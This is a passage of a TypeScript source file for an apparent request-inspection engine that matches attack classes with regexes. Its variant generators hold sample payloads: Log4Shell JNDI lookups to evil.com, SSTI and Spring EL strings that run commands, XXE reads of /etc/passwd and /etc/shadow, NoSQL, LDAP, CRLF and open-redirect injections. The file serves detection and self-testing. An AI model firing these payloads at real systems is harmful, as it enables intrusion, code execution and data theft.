    description: 'JNDI lookup injection (Log4Shell) to achieve remote code execution via logging',
    category: 'injection',
    severity: 'critical',

    detect: (input: string) => {
        const d = deepDecode(input)
        // The invariant: ${...} with jndi, env, sys, java, lower, upper, date lookups
        // Log4Shell and its bypass variants
        return /\$\{(?:jndi|lower|upper|env|sys|java|date|main|bundle|ctx|spring|kubernetes|docker|log4j)[\s:]/i.test(d) ||
            /\$\{.*?\$\{/i.test(d) // nested lookup bypass
    },

    generateVariants: (count: number) => {
        const variants = [
            '${jndi:ldap://evil.com/a}',
            '${jndi:rmi://evil.com/a}',
            '${jndi:dns://evil.com/a}',
            '${${lower:j}ndi:ldap://evil.com/a}',
            '${${upper:J}NDI:ldap://evil.com/a}',
            '${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}',
            '${jndi:ldap://${env:USER}.evil.com/a}',
            '${${env:NaN:-j}ndi${env:NaN:-:}ldap://evil.com/a}',
            '${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://evil.com/a}',
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}


// ═══════════════════════════════════════════════════════════════════
// L2 INVARIANT DEFINITIONS — Extended Attack Classes
// ═══════════════════════════════════════════════════════════════════

const SSTI_JINJA_TWIG: InvariantDefinition = {
    class: 'ssti_jinja_twig',
    description: 'Server-side template injection via Jinja2/Twig syntax — {{}} or {%%} expressions that evaluate on the server',
    category: 'injection',
    severity: 'critical',
    detect: (input: string) => {
        const d = deepDecode(input)
        return /\{\{.*(?:__class__|__mro__|__subclasses__|__builtins__|__globals__|config|lipsum|cycler|joiner|namespace|request\.|self\.).*\}\}/i.test(d)
            || /\{%.*(?:import|include|extends|block|macro|call).*%\}/i.test(d)
            || /\{\{.*(?:\d+\s*[\+\-\*\/]\s*\d+).*\}\}/.test(d) && /\{\{.*\|.*\}\}/.test(d)
    },
    generateVariants: (count: number) => {
        const v = ['{{config.__class__.__init__.__globals__}}', '{{lipsum.__globals__.os.popen("id").read()}}',
            '{%import os%}{{os.popen("id").read()}}', '{{self.__class__.__mro__[2].__subclasses__()}}',
            '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}']
        return v.slice(0, count)
    },
}

const SSTI_EL_EXPRESSION: InvariantDefinition = {
    class: 'ssti_el_expression',
    description: 'Expression Language injection — ${...} or #{...} expressions in Java EL, Spring SpEL, or OGNL',
    category: 'injection',
    severity: 'critical',
    detect: (input: string) => {
        const d = deepDecode(input)
        return /\$\{.*(?:Runtime|ProcessBuilder|exec|getClass|forName|getMethod|invoke).*\}/i.test(d)
            || /#\{.*(?:T\(|new |java\.).*\}/i.test(d)
            || /%\{.*(?:#cmd|#context|#attr|@java).*\}/i.test(d)
    },
    generateVariants: (count: number) => {
        const v = ['${T(java.lang.Runtime).getRuntime().exec("id")}', '#{T(java.lang.Runtime).getRuntime().exec("id")}',
            '${#rt=@java.lang.Runtime@getRuntime(),#rt.exec("id")}',
            '${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}']
        return v.slice(0, count)
    },
}

const NOSQL_OPERATOR_INJECTION: InvariantDefinition = {
    class: 'nosql_operator_injection',
    description: 'NoSQL query operator injection — MongoDB $gt, $ne, $regex operators in user input',
    category: 'injection',
    severity: 'high',
    detect: (input: string) => {
        const d = deepDecode(input)
        return /\$(?:gt|gte|lt|lte|ne|eq|in|nin|regex|exists|type|where|or|and|not|nor|elemMatch)\b/i.test(d)
            || /\{"?\$(?:gt|ne|regex|where)"?\s*:/i.test(d)
    },
    generateVariants: (count: number) => {
        const v = ['{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}', '{"$where":"this.password.length>0"}',
            '{"username":{"$ne":""},"password":{"$ne":""}}']
        return v.slice(0, count)
    },
}

const NOSQL_JS_INJECTION: InvariantDefinition = {
    class: 'nosql_js_injection',
    description: 'NoSQL JavaScript injection — server-side JS execution via MongoDB $where or mapReduce',
    category: 'injection',
    severity: 'critical',
    detect: (input: string) => {
        const d = deepDecode(input)
        // Match both direct $where: and JSON-quoted "$where":"..." formats
        return /["']?\$where["']?\s*:\s*["']?(?:function|this\.|sleep|db\.|emit|tojson)/i.test(d)
            || /mapReduce.*function/i.test(d) && /emit\(/i.test(d)
    },
    generateVariants: (count: number) => {
        const v = ['{"$where":"sleep(5000)"}', '{"$where":"this.password.match(/^a/)"}',
            '{"$where":"function(){return this.admin==true;}"}']
        return v.slice(0, count)
    },
}

const XXE_ENTITY_EXPANSION: InvariantDefinition = {
    class: 'xxe_entity_expansion',
    description: 'XML External Entity injection — DTD entity definitions referencing external resources or causing expansion attacks',
    category: 'injection',
    severity: 'critical',
    detect: (input: string) => {
        const d = deepDecode(input)
        return /<!(?:DOCTYPE|ENTITY)\s+\S+\s+(?:SYSTEM|PUBLIC)\s+["'][^"']*["']/i.test(d)
            || /<!ENTITY\s+\S+\s+["'](?:file:|http:|ftp:|php:|expect:|data:)/i.test(d)
            || /<!ENTITY\s+\S+\s+SYSTEM/i.test(d)
    },
    generateVariants: (count: number) => {
        const v = ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><x>&xxe;</x>']
        return v.slice(0, count)
    },
}

const XML_INJECTION: InvariantDefinition = {
    class: 'xml_injection',
    description: 'XML injection — unescaped XML metacharacters or CDATA injection in user input',
    category: 'injection',
    severity: 'medium',
    detect: (input: string) => {
        const d = deepDecode(input)
        return /<!(?:DOCTYPE|ENTITY)/i.test(d)
            || /<!\[CDATA\[.*\]\]>/i.test(d)
            || /&(?!amp;|lt;|gt;|quot;|apos;|#)\w+;/.test(d)
    },
    generateVariants: (count: number) => {
        const v = ['<![CDATA[<script>alert(1)</script>]]>', '<!DOCTYPE test [<!ENTITY foo "bar">]>',
            '<x>&custom_entity;</x>']
        return v.slice(0, count)
    },
}

const CRLF_HEADER_INJECTION: InvariantDefinition = {
    class: 'crlf_header_injection',
    description: 'CRLF injection — \\r\\n sequences in user input that can inject HTTP headers or split responses',
    category: 'injection',
    severity: 'high',
    detect: (input: string) => {
        const d = deepDecode(input)
        return /%0[dD]%0[aA]/i.test(input) || /\r\n/i.test(d) && /(?:Set-Cookie|Location|Content-Type|HTTP\/)/i.test(d)
    },
    generateVariants: (count: number) => {
        const v = ['%0d%0aSet-Cookie: admin=true', '%0d%0aLocation: http://evil.com',
            'value%0d%0a%0d%0a<script>alert(1)</script>', '\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html']
        return v.slice(0, count)
    },
}

const GRAPHQL_INTROSPECTION: InvariantDefinition = {
    class: 'graphql_introspection',
    description: 'GraphQL introspection query — exposes the full schema including types, fields, and arguments',
    category: 'injection',
    severity: 'low',
    detect: (input: string) => {
        const d = deepDecode(input)
        return /__schema\s*\{/i.test(d) || /__type\s*\(/i.test(d)
            || /\{\s*__schema\s*\{.*queryType/i.test(d)
    },
    generateVariants: (count: number) => {
        const v = ['{__schema{queryType{name}}}', '{__schema{types{name fields{name}}}}',
            'query{__type(name:"User"){fields{name type{name}}}}']
        return v.slice(0, count)
    },
}

const GRAPHQL_BATCH_ABUSE: InvariantDefinition = {
    class: 'graphql_batch_abuse',
    description: 'GraphQL batch query abuse — sending many queries in a single request for brute-force or DoS',
    category: 'injection',
    severity: 'medium',
    detect: (input: string) => {
        const d = deepDecode(input)
        // Multiple query aliases or array of operations
        const aliasCount = (d.match(/\w+\s*:\s*\w+\s*\(/g) || []).length
        return aliasCount >= 5
            || /^\s*\[.*\{.*query.*\}.*\{.*query.*\}/s.test(d)
    },
    generateVariants: (count: number) => {
        const v = ['[{"query":"{ user(id:1) { name } }"},{"query":"{ user(id:2) { name } }"},{"query":"{ user(id:3) { name } }"},{"query":"{ user(id:4) { name } }"},{"query":"{ user(id:5) { name } }"},{"query":"{ user(id:6) { name } }"}]',
            '{ a1: login(u:"a",p:"1") a2: login(u:"b",p:"2") a3: login(u:"c",p:"3") a4: login(u:"d",p:"4") a5: login(u:"e",p:"5") }']
        return v.slice(0, count)
    },
}

const OPEN_REDIRECT_BYPASS: InvariantDefinition = {
    class: 'open_redirect_bypass',
    description: 'Open redirect bypass — URL schemes and encoding tricks to redirect to malicious domains',
    category: 'injection',
    severity: 'medium',
    detect: (input: string) => {
        const d = deepDecode(input)
        return /\/\/[^/]+\.[^/]+/.test(d) && /(?:redirect|url|next|return|goto|dest|target|rurl|forward)\s*[=:]/i.test(d)
            || /\\\\[^\\]+\\/.test(d) // Backslash-based redirect
            || /(?:redirect|url|next|goto)=(?:\/\/|https?:|%2[fF]%2[fF])/i.test(input)
    },
    generateVariants: (count: number) => {
        const v = ['?redirect=//evil.com', '?url=https://evil.com', '?next=%2F%2Fevil.com',
            '?redirect=\\\\evil.com\\path', '?goto=//evil.com%0d%0a']
        return v.slice(0, count)
    },
}

const MASS_ASSIGNMENT: InvariantDefinition = {
    class: 'mass_assignment',
    description: 'Mass assignment attack — injecting admin/role/privilege fields in user-controlled request bodies',
    category: 'injection',
    severity: 'high',
    detect: (input: string) => {
        const d = deepDecode(input)
        return /(?:"|\b)(?:role|isAdmin|is_admin|admin|privilege|permission|access_level|user_type|account_type|verified|approved|activated)\s*"\s*:\s*(?:true|"admin"|"root"|1|"superuser")/i.test(d)
    },
    generateVariants: (count: number) => {
        const v = ['{"name":"test","role":"admin"}', '{"email":"a@b.com","isAdmin":true}',
            '{"username":"test","is_admin":true,"access_level":"superuser"}',
            '{"name":"test","permission":"admin","verified":true}']
        return v.slice(0, count)
    },
}

const LDAP_FILTER_INJECTION: InvariantDefinition = {
    class: 'ldap_filter_injection',
    description: 'LDAP filter injection — unescaped metacharacters in LDAP search filters',
    category: 'injection',
    severity: 'high',
    detect: (input: string) => {
        const d = deepDecode(input)
        return /\(\|?\(?\w+=\*\)/.test(d) // Wildcard filter
            || /\)\(\w+=/.test(d) // Filter concatenation
            || /\(\|\(\w+=\*\)\)/.test(d) // OR wildcard
            || /\x00/.test(d) && /\(/.test(d) // Null byte in filter
    },
    generateVariants: (count: number) => {
        const v = ['*)(uid=*))(|(uid=*', '*(|(mail=*))', 'admin)(|(password=*)',
            '*)(&(objectClass=*)']
        return v.slice(0, count)
    },
}

const REGEX_DOS: InvariantDefinition = {
    class: 'regex_dos',
    description: 'Regular expression denial of service — inputs designed to cause catastrophic backtracking in regex engines',
    category: 'injection',
    severity: 'medium',
    detect: (input: string) => {
        // Detect long repetitive patterns that cause backtracking
        return input.length > 100 && /(.)\1{50,}/.test(input)
            || /^(a+)+$/.test('') === false && input.length > 50 && /(.{2,})\1{20,}/.test(input)
    },
    generateVariants: (count: number) => {
        const v = ['a'.repeat(100) + '!', 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!',
        'x'.repeat(200)]
        return v.slice(0, count)
    },
}


// ═══════════════════════════════════════════════════════════════════
// THE ENGINE
// ═══════════════════════════════════════════════════════════════════

/** All registered invariant definitions */
const ALL_INVARIANTS: InvariantDefinition[] = [
    // SQL Injection (7)
    SQL_STRING_TERMINATION,
    SQL_TAUTOLOGY,
    SQL_UNION_EXTRACTION,
    SQL_STACKED_EXECUTION,
    SQL_TIME_ORACLE,
    SQL_ERROR_ORACLE,
    SQL_COMMENT_TRUNCATION,
    // XSS (5)
    XSS_TAG_INJECTION,
    XSS_EVENT_HANDLER,
    XSS_PROTOCOL_HANDLER,
    XSS_TEMPLATE_EXPRESSION,
    XSS_ATTRIBUTE_ESCAPE,
    // Path Traversal (3)
    PATH_DOTDOT_ESCAPE,
    PATH_NULL_TERMINATE,
    PATH_ENCODING_BYPASS,
    // Command Injection (3)
    CMD_SEPARATOR,
    CMD_SUBSTITUTION,
    CMD_ARGUMENT_INJECTION,
    // SSRF (3)
    SSRF_INTERNAL_REACH,
    SSRF_CLOUD_METADATA,
    SSRF_PROTOCOL_SMUGGLE,
    // Deserialization (3)
    DESER_JAVA_GADGET,
    DESER_PHP_OBJECT,
    DESER_PYTHON_PICKLE,
    // Auth (2)
    AUTH_NONE_ALGORITHM,
    AUTH_HEADER_SPOOF,
    // Injection (2)
    PROTO_POLLUTION,
    LOG_JNDI_LOOKUP,
    // L2 Evaluators
    SSTI_JINJA_TWIG,
    SSTI_EL_EXPRESSION,
    NOSQL_OPERATOR_INJECTION,
    NOSQL_JS_INJECTION,
    XXE_ENTITY_EXPANSION,
    XML_INJECTION,
    CRLF_HEADER_INJECTION,
    GRAPHQL_INTROSPECTION,
    GRAPHQL_BATCH_ABUSE,
    OPEN_REDIRECT_BYPASS,
    MASS_ASSIGNMENT,
    LDAP_FILTER_INJECTION,
    REGEX_DOS,
]

/**
 * The INVARIANT Engine.
 *
 * Detects attack payloads by matching invariant CLASSES,
 * not specific signatures. This catches novel variants
 * that have never been seen before.
 */
export class InvariantEngine {
    private readonly definitions: InvariantDefinition[]

    constructor() {
        this.definitions = ALL_INVARIANTS
    }

    /**
     * Analyze request input against all invariant classes.
     * Returns every matching class — a single payload may
     * express multiple invariants (e.g., SQL string termination + tautology).
     *
     * @param input The decoded request content to analyze (path + query + relevant headers)
     * @param staticRuleIds IDs of static signature rules that already matched.
     *                      Used to determine if this is a NOVEL variant.
     */
    detect(input: string, staticRuleIds: string[]): InvariantMatch[] {
        const matches: InvariantMatch[] = []

        for (const def of this.definitions) {
            try {
                if (def.detect(input)) {
                    // Is this a novel variant?
                    // Novel = invariant engine catches it, but NO static signature did
                    const isNovel = staticRuleIds.length === 0

                    matches.push({
                        class: def.class,
                        confidence: isNovel ? 0.75 : 0.95,
                        category: def.category,
                        severity: def.severity,
                        isNovelVariant: isNovel,
                        description: def.description,
                    })
                }
            } catch {
                // Never let a detection failure break the engine
            }
        }

        return matches
    }

    /**
     * Check headers specifically for auth bypass invariants
     * that can't be detected from path/query alone.
     */
    detectHeaderInvariants(headers: Headers): InvariantMatch[] {
        const matches: InvariantMatch[] = []

        // Auth header spoof: multiple forwarding headers = spoofing attempt
        const forwardHeaders = [
            'x-forwarded-for', 'x-real-ip', 'x-originating-ip',
            'x-remote-ip', 'x-client-ip', 'x-custom-ip-authorization',
        ]
        const forwardCount = forwardHeaders.filter(h => headers.has(h)).length
        if (forwardCount >= 3) {
            matches.push({
                class: 'auth_header_spoof',
                confidence: 0.8,
                category: 'auth',
                severity: 'medium',
                isNovelVariant: false,
                description: AUTH_HEADER_SPOOF.description,
            })
        }

        // URL rewrite bypass headers
        if (headers.has('x-original-url') || headers.has('x-rewrite-url')) {
            matches.push({
                class: 'auth_header_spoof',
                confidence: 0.85,
                category: 'auth',
                severity: 'high',
                isNovelVariant: false,
                description: 'URL rewrite header used to bypass path-based access controls',
            })
        }

        // JWT alg:none in Authorization header
        const auth = headers.get('authorization') ?? ''
        if (auth.startsWith('Bearer ') && AUTH_NONE_ALGORITHM.detect(auth.slice(7))) {
            matches.push({
                class: 'auth_none_algorithm',
                confidence: 0.95,
                category: 'auth',
                severity: 'critical',
                isNovelVariant: false,
                description: AUTH_NONE_ALGORITHM.description,
            })
        }

        return matches
    }

    /**
     * Should this request be blocked? Returns true if any invariant
     * match has sufficient confidence.
     */
    shouldBlock(matches: InvariantMatch[]): boolean {
        return matches.some(m => m.confidence >= 0.7)
    }

    /**
     * Get the highest severity from a set of matches.
     */
    highestSeverity(matches: InvariantMatch[]): 'critical' | 'high' | 'medium' | 'low' | 'info' {
        const order = ['info', 'low', 'medium', 'high', 'critical'] as const
        let max = 0
        for (const m of matches) {
            const idx = order.indexOf(m.severity)
            if (idx > max) max = idx
        }
        return order[max] ?? 'info'
    }

    /**
     * Generate variant payloads for a given invariant class.
     * Used for self-testing and internal probing.
     */
    generateVariants(cls: InvariantClass, count: number): string[] {
        const def = this.definitions.find(d => d.class === cls)
        if (!def) return []
        return def.generateVariants(count)
    }

    /** Number of registered invariant classes */
    get classCount(): number {
        return this.definitions.length
    }

    /** All registered class identifiers */
    get classes(): InvariantClass[] {
        return this.definitions.map(d => d.class)
    }
}
